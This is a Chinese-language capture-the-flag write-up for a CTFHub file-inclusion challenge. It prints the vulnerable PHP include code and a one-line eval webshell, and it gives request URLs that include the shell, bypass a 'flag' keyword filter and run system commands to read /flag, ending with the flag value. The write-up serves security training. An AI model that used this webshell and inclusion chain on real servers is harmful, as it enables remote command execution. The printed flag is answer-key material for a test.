---
title: CTFHub-RCE-文件包含 Writeup
date: 2026-10-24
categroy: web
tags: [CTFHub, RCE, 文件包含]
---
## 漏洞分析
### 1. 源码审计
访问靶机首页，页面直接给出了后端 PHP 源码：
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
漏洞点：include $_GET["file"]; 存在任意文件包含漏洞。如果没有进行严格的路径校验，攻击者可以包含任意文件。
防御逻辑：使用 strpos() 检查 file 参数中是否包含敏感词 flag。如果包含，则触发 Hacker!!!并阻断执行。
### 2. WebShell 探测
页面底部有提示 i have a shell, how to use it ? 并提供了一个 shell.txt 的链接。
直接访问该文件，得到内容：
<?php eval($_REQUEST['ctfhub']);?>
这是一个一句话木马，接收 ctfhub 参数，并使用 eval() 将传入的内容作为 PHP 代码执行。
## 利用思路
1. 包含木马：利用源码中的 include 函数，构造 ?file=shell.txt，将 shell.txt 当作 PHP 文件包含进来执行。
2. 绕过限制：源码过滤了 file 参数中的 flag 字符串。但是，我们需要执行的系统命令是赋给木马参数 ctfhub 的。因为命令不在 file 参数中传输，所以完美绕过了 strpos 的关键字检测。
3. 执行命令：在 ctfhub 参数中构造 system('命令');，利用 WebShell 执行系统命令（RCE）。
## 解题步骤
### 第一步：测试木马连通性
通过 file 参数包含 shell.txt，并通过 ctfhub 参数执行 ls 命令查看当前目录文件。
http://靶机地址/?file=shell.txt&ctfhub=system('ls');
回显：index.php shell.txt。说明木马成功执行。
### 第二步：读取 Flag
尝试直接读取系统根目录下的 flag 文件（注意 URL 中的空格需要编码为 %20，也可直接输入空格由浏览器自动编码）。
http://靶机地址/?file=shell.txt&ctfhub=system('cat%20/flag');
回显：页面成功回显 Flag 内容：
ctfhub{1454d69abd04bfd36ee61ecd}

